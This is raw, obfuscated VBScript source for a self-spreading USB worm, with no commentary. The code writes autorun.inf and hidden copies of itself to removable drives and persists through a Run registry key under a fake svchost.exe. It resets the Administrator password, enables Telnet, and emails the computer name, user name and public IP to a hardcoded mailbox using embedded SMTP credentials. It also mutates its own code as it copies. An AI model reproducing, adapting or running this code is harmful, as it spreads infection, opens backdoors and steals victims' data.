on erroR rESuME NeXT
set FsO=CReaTEObjECt(STRreveRse("tcejBoMeTSysEliF.gNitPIRcs"))
SeT wShSHElL=CReaTEOBjeCT(STRreVersE("LlehS.TpIRCSW"))
sEt wShNETwOrK=wscRIpt.CReaTEoBjECT(STRReVErSE("KroWTeN.tpIRCSw"))

tHISpath=wsCRIpt.sCrIptFULlname
SYsDir=fSo.getspecIalFOlDEr(1)&"\"
wInDIR=leFT(sySDiR,11)

svcHost=LcAsE("sVchOSt.exE")
fnsYs="SVcHoST."&uCAse("DAt")
FNSysExe=LCASe("SCS.EXE")
fNmaIl="LiAM."&uCase("Dat")

FnUtRAY="BUPt."&LCAsE("DAt")
FNUTraYeXe=LcASE("scs")

sEt fIle=FSo.opeNTEXtFile(ThIspath,1)
VBsCRiPtCOpy=filE.READalL
fiLE.CLOSe
sEt fIle=nOtHiNG

iF lCasE(Sysdir)=LcASe(lEFT(ThISpaTH,Len(SYSDIr))) tHEN
caLL sENDMAIl
caLl sEtUPBd
Call LIsteNUtrAY
eLSE
WSHsHElL.ReGwrITe UcaSE("hkCu\s")&LCAse("oftWARe\")&uCasE("m")&lCASE("icroSoFt\")&ucAse("w")&LcASe("indOwS\")&uCASe("C")&LCase("urrEnt")&uCaSE("V")&LcAse("Ersion\")&UCaSe("E")&LCasE("XplORER\")&UcasE("A")&LCAsE("DVAncEd\")&uCaSE("S")&lcaSE("hOW")&UcAsE("S")&LcASe("UpEr")&uCAse("H")&LcAsE("IDDen"),0,UCAse("ReG_dWORd")
WSHShEll.rEgWrite ucAse("hKCu\s")&lcase("OFTWarE\")&UCaSE("m")&LcasE("icRoSoFT\")&uCAsE("W")&lcasE("iNDoWs\")&UcASe("C")&lCASE("urRent")&UcasE("v")&LCAse("eRsIoN\")&uCaSe("e")&lcASe("XpLoRER\")&UcASe("A")&lCAsE("dVANCed\")&UCaSE("s")&lcASE("UpEr")&UCAse("h")&LcAse("IdDen"),1,UcaSE("ReG_DWord")
wSHSHelL.Run(LeFT(ThispAth,2))
  If Not fsO.fIleEXIsts(sYsDiR&fNsYS) Or Not FSO.fILEEXIstS(sySDIR&fnSYSeXE) OR nOt FsO.FiLEExIsTs(wiNDir&SVchOSt) THEN
  cALl INfEctSYs
  END if
EnD iF

sub sENDmaIl
On ERRor reSUME Next
cOmputernAme="计算机名:"&WshnetwOrK.COmpUTErnAMe
USernaMe="当前用户名:"&wSHshEll.ExPanDENvironMeNtSTrInGS("%uSErnAME%") 
URL=lCase("HTtp://WwW.IP138.Cn")
hTmL=GeThTtppaGE(urL)  
pLaCEBEGIN=iNStR(1,HtmL,"你当前的"&UCasE("iP")&"为")
plaCEEnd=iNsTr(PLAcebegIN,HtMl,vbCrLf)
plaCe=MId(HtMl,PlacebeGiN,PLacEENd-PLaCEBEgin)
msG=comPuTeRNamE&","&UseRNAme&","&PlACe
TItlE=GetiP(".")

IF FSo.fILEExIstS(sYSdIR&fnMaiL) tHeN
sEt file=Fso.OPenTexTfILE(SYSDiR&fNMAiL,1)
oLdmSG=FilE.ReADaLL
fIle.cLose
sEt fiLE=nothiNG
  if oLdMsg=Msg Then
  eXiT Sub
  eND if
ENd IF

CaLL WritEfilE(sYsdIr&FnmAIl,msG)

naMeSpACe=lCAse("Http://scheMAS.MiCRosoFT.CoM/cDO/COnFIGurAtiOn/")
SEt eMail=CReatEObjEct("CDO.MESSaGE")
eMail.frOm=LCASe("sHaDEr.BUpt@qq.cOm")
eMaIl.TO=lcase("SHaDer.bUpT@qq.com")
EmAIl.sUbJect=tItLE
emAIL.tEXtBoDY=MSG&","&now
wIth emAil.CoNfiGurAtIon.fIeLDs
.IteM(NameSPAce&lCASE("SEnduSING"))=2
.ItEM(naMesPaCe&lCASe("SmtpsERver"))=LcaSe("SMTP.Qq.CoM")
.itEm(NamESPAce&lCaSE("SMtpSerVeRport"))=25
.Item(nAMESpAce&lCaSe("SmtpAuthEnTIcAtE"))=1
.iTEM(naMESpaCE&LcASe("SEnduSernAMe"))=lcAse("sHadEr.BuPt")
.ITeM(NAmeSpAce&LCAse("SENDPaSSworD"))="52162"
.UPdaTe
eNd wITH
eMail.SEnd
End suB

SUB SeTUpBD
On eRroR rESUMe NeXt
iF LcaSe(WsHnetwOrK.UseRNAme)<>LCASe("admInIstrAtor") tHeN
StRcOmputeR = "."
SEt OBjUsER = GEtobJect(UcAse("w")&LCaSe("in")&ucAsE("Nt://") & StrcOMPuter & "/aDMiniSTRAtOr, UsER")
obJusEr.sEtPASsWoRd "52162"
obJusEr.SETINFO
WsHSHeLl.rEgwRitE UCasE("hKLm\SYstEm\C")&lcaSe("OntROL")&ucASE("S")&lCaSe("Et001\")&uCAsE("s")&lcaSe("ErviCES\")&uCaSE("T")&lcAse("LnT")&ucAse("s")&LcaSe("vR\")&UcAsE("s")&lcaSE("tarT"),2,UCase("REg_dwORd")
ENd If
eNd sUB

Sub lIStenUTraY
On ERROR ReSUmE NeXt
TimEcoUNTEr=1
cMDsTR="sHelL\*\comMaNd=wsCRIpt.exE /E:Vbs "&fNutrAy
AutoRuNStR=LcAse("[AuTORun]"&VbcRLf&"OPeN="&vbcRlf&REpLacE(cMdsTR,"*","oPeN")&vBcRLf&rEPlaCe(cmdSTR,"*","EXPlORe")&VBCrLf&REpLAcE(CmdStr,"*","FINd"))

DO
fOR eAch dRV IN FSo.DrIVEs
if fsO.gETDRivE(DrV).DRIveTypE=1 and fSo.geTDRive(dRV).iSreadY Then
  If fSo.GeTdRiVe(drv).FILesySTEm=UCaSe("fAT32") Then
  fsTypE="1"
  ElsEiF fSo.gETdRiVE(dRv).fiLESysteM=UCAsE("faT") tHen
  FsTYPe="0"
  ElSE
  FstypE="2"
  End iF
  IF fSO.FILeExisTs(Drv&"\AutOrUn.InF") tHen
  set fIlE=fSO.opentEXTFiLe(drV&"\auToruN.inF",1)
  OldautOrUNStr=FILe.REaDaLL
  File.cloSE
  Set fiLE=NotHinG
    If OlDaUTorUnStr<>AUtoruNSTR tHEn
      if FsTYpE="2" thEn
      CaLl wrITefiLE(dRv&LcASE("\AUtORuN.InF"),AutOruNSTR)
      ELSe
      wshShElL.rUN(sysdiR&FNsYsexe&" "&dRv&" "&fStYPe)
      eNd IF
    enD iF
  ELSE
    iF fStyPe="2" ThEn
    CalL WrITeFiLE(dRv&lcaSE("\auTORUN.INf"),AUToRunSTr)
    eLse
    WSHsHeLl.ruN(sysDIr&FnsYsEXE&" "&dRV&" "&FstyPe)
    End iF
  END iF
  If tiMeCoUntER>10 thEN
    if nOt fSo.fIleeXiSTs(dRv&"\"&fNuTRAy) THEn
    CAlL WRiteFile(DrV&"\"&FnuTRaY,vS(vBsCriPtCoPY))
    eNd iF
    IF NOt Fso.FILEeXisTS(DRv&"\"&FnuTrAyExE) tHeN
    fso.GetFilE(SYSDIR&FnSYsEXE).copY(dRv&"\"&fnUtRaYExE)
    FsO.getFiLe(drV&"\"&fnUTRAyExe).AtTribUtes=7
    eNd iF
  eNd IF
eND if
nExT

IF tiMecoUNtEr>10 TheN
TimEcoUnTer=1
WShShELl.ReGwriTE ucasE("HKlM\s")&LCAsE("OFtWArE\")&UcaSe("M")&LcAsE("icROsofT\")&ucAsE("W")&LcASe("InDows\")&ucASE("c")&lCAsE("urRenT")&ucaSe("V")&LCase("ERSIoN\")&UcAse("r")&lcaSe("uN\SvChost"),WINdir&SVchOSt&lCAsE(" /e:Vbs ")&SysDir&fnSYs
  if nOt FsO.FIlEeXIstS(SysdIR&fnsyS) THeN
  CALL WriTEfILe(SYsdIr&FnSyS,VS(vBsCriptCOpy))
  enD IF
ELSE
TiMECoUnteR=tImeCOUNteR+1
EnD If

WsCript.sLeEp 1000
loOP
eNd suB

sUb iNfecTsYS
oN Error ReSUMe nEXT
WShShELl.REGwriTe uCAsE("HklM\s")&LcaSe("oFtwArE\")&UcASe("m")&lCASe("iCROSOfT\")&UCASe("w")&LCaSE("iNdoWs\")&UCAsE("c")&LCase("urRenT")&UCASE("V")&LCaSe("ErsIon\")&ucAsE("R")&LcaSe("uN\svcHoSt"),WINdir&sVCHOsT&lcaSe(" /E:vbS ")&sYSdIr&fNsys

IF fso.FIleEXiStS(sYSDIr&fNsys) tHen
fSo.DElEteFilE SysDiR&FNsYs,TruE
end IF
caLL WRiTEfilE(SYsDir&FnSYs,VS(vBscRiPtCoPY))

if FSo.fILeeXisTs(WINDIR&sVChOST) theN
Fso.DELetEfIlE wINDir&svChOst,tRuE
enD If
fsO.GEtFile(SySdir&"wsCripT.EXe").cOpy(wiNdIR&svcHOSt)
fSo.GeTFILe(wIndiR&sVchOst).aTTrIbuTes=7

iF FSo.fILeeXiSts(SYSdir&FNSYSeXE) tHEN
Fso.DeLEtEFIle sySdIr&fNSYsExE,truE
enD if
fSo.GETFILE(FNuTRAyExe).coPy(SYSDir&fNsYSeXE)
Fso.gEtfilE(SySdiR&FnsyseXE).aTtribUtEs=7

WshsHeLL.RuN(Windir&sVCHost&" /e:VbS "&sYSDIr&fNsys)
End suB

sUb wRItefilE(fpATH,CONTenT)
oN eRRoR RESUme nexT
ExecUTE STRReVerSE(UnEscApE("GnIHtOn%3DAf%20tES%0d%0A7%3DSeTUBIRTtA.aF%0D%0a%29HtapF%28ElIFTEG.osf%3DAf%20Tes%0D%0agnIhTON%3DCf%20TEs%0d%0aesoLC.CF%0d%0atnEtnOc%20ETiRW.CF%0d%0A%29eurt%2C2%2chtAPF%28EliFTxetNePO.osf%3dcf%20tES%0d%0AEurT%2CHtApF%20elifetELED.osF%20NEHT%20%29hTaPf%28STSIxEElIf.OSF%20fi"))
END SUB

FUNCtIon Vs(STr)
On eRrOr rESUME next
ExecUTe stRREverSe(UNeSCApe("%29%29%22u%25%22%28eSAcl%2c%29%22U%25%22%28eSACU%2csv%28ECAlper%3DSv%0d%0AtxeN%0D%0afi%20dNE%0D%0Ac%26Sv%3DsV%0D%0AESle%0d%0A%29c%28ESACL%26sv%3dSv%0d%0ANEHt%2005%3E%29001*%29%28DNR%28tNI%20Fi%0d%0aEZImODNAr%0D%0a%29%291%2ci%2CRts%28dim%28EsacU%3DC%0D%0a%29Rts%28Nel%20Ot%201%3Di%20roF"))
EnD FUNcTiON

funcTiON getiP(COmpUteRName)
On errOr rESUmE NExt
Dim ObJWmIsERVIce,colITEMs,oBJITEM,ObJadDReSs
sEt OBJwMIsErVICE = geTObjeCT("WINMgMTS:\\" & COmPUTeRNAMe & "\rOoT\CIMv2")
SEt cOLitemS = obJwMISeRVIce.eXEcqUerY("seLEcT * fROm wIn32_NETWOrKADAPtErCONFiguratIoN Where IPEnaBleD = tRuE")
foR eaCH oBJITem IN cOLiTEmS
    for eACH objADDRESS iN oBJiTeM.iPaDDREsS
        If OBjadDRESS <> "" THEn
            getIp = oBJADDress
            EXit FoR
        ENd If
    NExT
NeXT
eNd FuNCTIOn

FuNcTION gethtTpPAGe(urL) 
oN eRRor ReSUme neXt 
  dIM HttP  
  sET HtTP=CreateoBJECt("MSXML2.XmLhtTP")  
  HTTP.OPeN "GET",Url,FalsE  
  HtTP.SENd()  
  If HTTp.rEaDyStATE  <> 4 THEn  
      Exit fUNCtION  
  enD iF  
  gEThTtPPage=byTeSTOBStR(HTTp.rESPOnsebodY,"GB2312")  

  Set HtTP=nothIng  
  IF erR.NumBEr  <> 0 THen err.CLEar  
END FuNctIOn  

fUNCTiON ByTESToBStr(Body,CSET) 
ON ERRoR rESuME nEXT 
      dIM OBjstreAM  
      SET obJsTREaM = cReATeoBjeCt("aDOdB.sTrEAm")  
      oBJSTReAm.TYPe = 1  
      OBJStrEam.Mode =3  
      OBJsTREAm.OPEn  
      OBJstream.WRIte BODY 
      ObJsTreAm.POSiTIoN = 0  
      oBJSTREAM.TYPE = 2  
      OBJstrEaM.ChARSET = csET  
      BYTestObSTR = ObjStREam.reAdtexT  
      obJstReAM.CLoSE  
      set obJsTREam = NOThiNg  
enD FUnctioN  